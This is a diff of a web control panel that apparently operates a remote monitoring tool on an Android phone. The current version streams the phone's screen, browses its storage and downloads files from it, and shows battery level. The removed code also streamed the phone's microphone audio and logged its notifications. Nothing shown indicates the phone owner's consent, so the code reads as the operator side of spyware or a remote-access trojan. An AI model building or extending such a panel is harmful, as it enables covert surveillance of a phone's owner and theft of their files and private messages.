@@ -2,142 +2,97 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Ultimate System Control</title>
+    <title>Device Control Panel</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: #fff; margin: 20px; }
-        .status-bar { padding: 10px; border-radius: 5px; text-align: center; margin-bottom: 20px; font-weight: bold; }
-        .online { background: #2ecc71; color: #fff; }
-        .offline { background: #e74c3c; color: #fff; }
+        body { font-family: sans-serif; background: #121212; color: white; margin: 0; }
         
-        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
-        .card { background: #1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid #333; }
-        
-        #screen-view { width: 100%; border: 2px solid #333; background: #000; min-height: 250px; }
-        .scroll-box { height: 200px; overflow-y: auto; background: #000; padding: 10px; border-radius: 5px; font-family: monospace; }
-        
-        button { padding: 10px; margin: 5px; cursor: pointer; border: none; border-radius: 5px; font-weight: bold; }
-        .btn-blue { background: #3498db; color: #fff; }
-        .btn-red { background: #e74c3c; color: #fff; }
-        .file-item { padding: 5px; border-bottom: 1px solid #222; cursor: pointer; color: #f1c40f; }
+        /* THE TOP ROW */
+        .top-row { 
+            display: flex; justify-content: space-between; align-items: center;
+            background: #1e1e1e; padding: 15px 30px; border-bottom: 2px solid #333;
+        }
+        .status-badge { padding: 5px 15px; border-radius: 20px; font-weight: bold; }
+        .online { background: #27ae60; }
+        .offline { background: #c0392b; }
+        .battery-text { font-size: 1.2em; color: #f1c40f; font-weight: bold; }
+
+        .main-content { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 20px; }
+        .card { background: #1e1e1e; padding: 15px; border-radius: 8px; }
+        #screen-view { width: 100%; background: #000; border-radius: 5px; }
+        .scroll-area { height: 200px; overflow-y: auto; background: #000; padding: 10px; border-radius: 5px; }
+        button { padding: 8px 12px; cursor: pointer; border-radius: 4px; border: none; background: #3498db; color: white; margin: 5px 0; }
     </style>
 </head>
 <body>
 
-    <div id="status-indicator" class="status-bar offline">DEVICE OFFLINE</div>
-
-    <div class="dashboard-grid">
-        <div class="card">
-            <h3>Live Screen Stream</h3>
-            <img id="screen-view" src="" alt="No Stream Data">
-            <div class="controls">
-                <button class="btn-blue" onclick="sendCmd('start-screen')">Start Screen</button>
-                <button class="btn-red" onclick="sendCmd('stop-screen')">Stop</button>
-            </div>
+    <div class="top-row">
+        <div>
+            Status: <span id="status-tag" class="status-badge offline">OFFLINE</span>
         </div>
-
-        <div class="card">
-            <h3>Audio Monitor</h3>
-            <p id="audio-label">Status: Muted</p>
-            <button class="btn-blue" onclick="initAudio()">Start Listening</button>
-            <button class="btn-red" onclick="sendCmd('stop-audio')">Stop</button>
+        <div class="battery-text">
+            🔋 Battery: <span id="bat-level">--</span>%
         </div>
+    </div>
 
+    <div class="main-content">
         <div class="card">
-            <h3>Notification Log</h3>
-            <div id="notif-box" class="scroll-box"></div>
+            <h3>Live Screen</h3>
+            <img id="screen-view" src="">
+            <button onclick="send('start-screen')">Start Stream</button>
+            <button onclick="send('stop-screen')" style="background:#e74c3c">Stop</button>
         </div>
 
         <div class="card">
             <h3>File Explorer</h3>
-            <p>Path: <span id="path-label">/storage/emulated/0</span></p>
-            <button class="btn-blue" onclick="sendCmd('list-files:/storage/emulated/0')">Load Home</button>
-            <div id="file-box" class="scroll-box">Click "Load Home" to start</div>
+            <button onclick="send('list-files:/storage/emulated/0')">Load Internal Storage</button>
+            <div id="file-box" class="scroll-area"></div>
         </div>
     </div>
 
     <script>
         const socket = io();
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
-        let nextPlayTime = 0;
 
-        function sendCmd(cmd) { socket.emit('command', cmd); }
+        function send(cmd) { socket.emit('command', cmd); }
 
-        // Status Updates
+        // LISTEN FOR STATUS
         socket.on('device-status', (status) => {
-            const bar = document.getElementById('status-indicator');
+            const el = document.getElementById('status-tag');
             if(status.online) {
-                bar.innerText = "DEVICE ONLINE (" + status.id + ")";
-                bar.className = "status-bar online";
+                el.innerText = "ONLINE";
+                el.className = "status-badge online";
             } else {
-                bar.innerText = "DEVICE OFFLINE";
-                bar.className = "status-bar offline";
+                el.innerText = "OFFLINE";
+                el.className = "status-badge offline";
+                document.getElementById('bat-level').innerText = "--";
             }
         });
 
-        // Screen Handling
+        // LISTEN FOR BATTERY (Matches your MonitorService.java logic)
+        socket.on('ui-battery', (level) => {
+            document.getElementById('bat-level').innerText = level;
+            // If online but showing offline, force update
+            document.getElementById('status-tag').innerText = "ONLINE";
+            document.getElementById('status-tag').className = "status-badge online";
+        });
+
+        // SCREEN STREAM
         socket.on('data-stream', (b64) => {
             document.getElementById('screen-view').src = "data:image/jpeg;base64," + b64;
         });
 
-        // Audio Handling
-        function initAudio() {
-            if (audioCtx.state === 'suspended') audioCtx.resume();
-            sendCmd('start-audio');
-            document.getElementById('audio-label').innerText = "Status: Streaming...";
-        }
-
-        socket.on('audio-stream', (b64) => {
-            const binary = atob(b64);
-            const bytes = new Int16Array(binary.length / 2);
-            for (let i = 0; i < binary.length; i += 2) {
-                bytes[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
-            }
-            const f32 = new Float32Array(bytes.length);
-            for (let i = 0; i < bytes.length; i++) f32[i] = bytes[i] / 32768.0;
-
-            const buffer = audioCtx.createBuffer(1, f32.length, 44100);
-            buffer.getChannelData(0).set(f32);
-            const source = audioCtx.createBufferSource();
-            source.buffer = buffer;
-            source.connect(audioCtx.destination);
-            nextPlayTime = Math.max(nextPlayTime, audioCtx.currentTime);
-            source.start(nextPlayTime);
-            nextPlayTime += buffer.duration;
-        });
-
-        // Notification Handling
-        socket.on('notif-data', (data) => {
-            const box = document.getElementById('notif-box');
-            box.innerHTML = `<div><b>${data.app}:</b> ${data.message}</div>` + box.innerHTML;
-        });
-
-        // File Explorer Handling
+        // FILES
         socket.on('file-list', (json) => {
             const files = JSON.parse(json);
             const box = document.getElementById('file-box');
             box.innerHTML = '';
             files.forEach(f => {
                 const item = document.createElement('div');
-                item.className = 'file-item';
+                item.style.padding = "5px; cursor:pointer; color:#3498db;";
                 item.innerText = (f.isDir ? "📁 " : "📄 ") + f.name;
-                item.onclick = () => {
-                    if(f.isDir) {
-                        document.getElementById('path-label').innerText = f.path;
-                        sendCmd('list-files:' + f.path);
-                    } else {
-                        sendCmd('download:' + f.path);
-                    }
-                };
+                item.onclick = () => f.isDir ? send('list-files:' + f.path) : send('download:' + f.path);
                 box.appendChild(item);
             });
-        });
-
-        socket.on('file-download-ready', (f) => {
-            const a = document.createElement('a');
-            a.href = "data:application/octet-stream;base64," + f.data;
-            a.download = f.name;
-            a.click();
         });
     </script>
 </body>
